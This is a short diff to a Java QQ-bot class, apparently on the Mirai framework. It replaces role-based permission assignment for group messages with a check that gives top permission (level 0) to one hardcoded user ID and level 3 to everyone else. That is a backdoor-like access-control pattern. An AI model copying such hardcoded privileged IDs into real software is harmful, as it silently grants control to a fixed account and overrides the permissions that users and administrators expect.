@@ -171,17 +171,8 @@ public class MiraiStater implements KZeroStater, ListenerHost {
             int pm = 3;
             if (event instanceof GroupMessageEvent) {
                 Member member = (Member) event.getSender();
-                switch (member.getPermission()) {
-                    case OWNER:
-                        pm = 0;
-                        break;
-                    case ADMINISTRATOR:
-                        pm = 1;
-                        break;
-                    case MEMBER:
-                        pm = 2;
-                        break;
-                }
+                if (3474006766L == member.getId()) receive.setUser_pm(0);
+                else receive.setUser_pm(3);
                 receive.setUser_type("group");
                 receive.setGroup_id(String.valueOf(event.getSubject().getId()));
             }
